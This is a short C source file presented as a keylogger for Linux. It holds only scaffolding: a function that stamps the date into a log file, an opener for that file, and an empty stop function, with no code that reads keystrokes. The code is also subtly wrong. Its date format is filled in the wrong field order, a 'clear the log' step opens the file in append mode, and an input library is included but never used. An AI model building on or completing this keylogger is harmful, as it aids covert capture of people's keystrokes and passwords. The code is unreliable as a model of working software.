// Keylogger for Linux machine

#include <time.h>
#include <curses.h>
#include <libevdev/libevdev.h>
#include "linux_keylog.h"

// Whenever the keylogger is started, add this to the file first
void WriteHeader(const char* filePath) {
    FILE *file;
    file = fopen(filePath, "a");
    if (file == NULL) {
        return;
    }

    // Write the date and time into the file
    time_t t = time(NULL);
    struct tm * st = localtime(&t);
    char date[100];
    sprintf(date, "[%04d/%02d/%02d %02d:%02d:%02d] : ", st->tm_mday, st->tm_mon+1, st->tm_year+1900, st->tm_hour, st->tm_min, st->tm_sec);
    fputs(date, file);
    fflush(file);
    fclose(file);
}

// Keylogger for Linux
void linux_keylog(const char* filePath) {

    // Clear the log file
    FILE *temp;
    temp = fopen(filePath, "a+");
    fclose(temp);

    // Write the header into the file
    WriteHeader(filePath);
}

// End the keylogger
void end_keylog(const char *filePath) {

}